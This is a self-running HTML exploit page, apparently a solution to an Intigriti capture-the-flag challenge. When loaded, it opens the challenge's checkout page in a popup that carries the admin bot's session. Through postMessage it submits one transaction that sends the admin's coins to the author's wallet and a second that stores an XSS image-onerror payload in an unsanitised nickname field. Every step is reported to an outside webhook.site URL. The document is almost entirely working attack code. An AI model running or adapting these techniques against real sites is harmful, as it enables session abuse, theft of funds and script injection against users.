<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>EXPLOIT LOADED</h1>
    <div id="log">Initializing...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';

        // XSS Payload - will trigger alert('gigawatz') when transaction loads in marketwatch
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

        const logDiv = document.getElementById('log');

        function log(msg, className = '') {
            const timestamp = new Date().toLocaleTimeString();
            logDiv.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span><br>`;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        async function executeExploit() {
            log('Starting XSS exploit via postMessage...', 'info');
            track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });

            // Admin bot HAS 1337COIN wallet (per docs)
            // checkout.html:311 loads userWallets from /api/wallets
            // We need to wait for init() to complete before sending postMessage
            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1`;
            log(`Opening checkout in popup (admin has 1337COIN wallet)...`, 'info');

            const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');

            if (!popup) {
                log('ERROR: Popup blocked! Please allow popups.', 'error');
                track('error', 'popup_blocked', {});
                return;
            }

            log('Popup opened - admin session inherited', 'success');
            track('popup_opened', 'success', {});

            // CRITICAL: Wait for popup's init() to load userWallets from /api/wallets
            // checkout.html:311-316 fetches wallets asynchronously
            setTimeout(async () => {
                // First, send a ping to verify popup is ready
                log('Pinging popup to verify readiness...', 'info');
                popup.postMessage({ type: 'ping' }, '*');

                // Wait a bit for response, then send transactions
                await new Promise(r => setTimeout(r, 1000));

                // Transaction 1: Send 1337COIN to your wallet
                log('Sending TX #1: 1337COIN to ' + YOUR_WALLET, 'info');
                track('tx1_start', 'sending_coins', { to: YOUR_WALLET, currency: '1337COIN' });

                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: 'CTF Player'
                    }
                }, '*');

                log('TX #1 sent via postMessage', 'success');
                track('tx1_sent', 'postMessage_sent', { to: YOUR_WALLET, currency: '1337COIN' });

                // Wait for transaction to process, then send TX #2
                await new Promise(r => setTimeout(r, 2000));

                // Transaction 2: Send 1337COIN to xss-payload with XSS in nickname
                log('Sending TX #2: XSS payload injection...', 'info');
                track('tx2_start', 'injecting_xss', { payload: XSS_PAYLOAD });

                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: 'xss-payload',
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: XSS_PAYLOAD  // UNSANITIZED in marketwatch.html:326-328
                    }
                }, '*');

                log('TX #2 sent - XSS injected in nickname!', 'success');
                track('tx2_sent', 'xss_injected', {
                    payload: XSS_PAYLOAD,
                    trigger: 'marketwatch_nickname_field',
                    currency: '1337COIN'
                });

                // Final tracking
                track('complete', 'exploit_complete', {
                    message: 'Admin must visit marketwatch to trigger XSS',
                    expected_alert: 'gigawatz'
                });

                log('EXPLOIT COMPLETE!', 'success');
                log('Transactions submitted:', 'info');
                log('  1. 1337COIN -> ' + YOUR_WALLET, 'info');
                log('  2. 1337COIN -> xss-payload (XSS in nickname)', 'info');
                log('', '');
                log('When admin visits marketwatch.html:', 'info');
                log('  XSS will trigger: alert("gigawatz")', 'success');

            }, 5000);  // Increased from 3000ms to 5000ms for wallet loading

            // Close popup after completion
            setTimeout(() => {
                if (popup && !popup.closed) {
                    popup.close();
                    log('Popup closed', 'info');
                }
            }, 8000);
        }

        // Listen for messages from popup (for debugging)
        window.addEventListener('message', (event) => {
            log('Received message from popup: ' + JSON.stringify(event.data), 'info');
            track('popup_message', 'received', { data: event.data });
        });

        // Auto-execute on page load
        window.addEventListener('load', () => {
            setTimeout(executeExploit, 500);
        });
    </script>
</body>
</html>
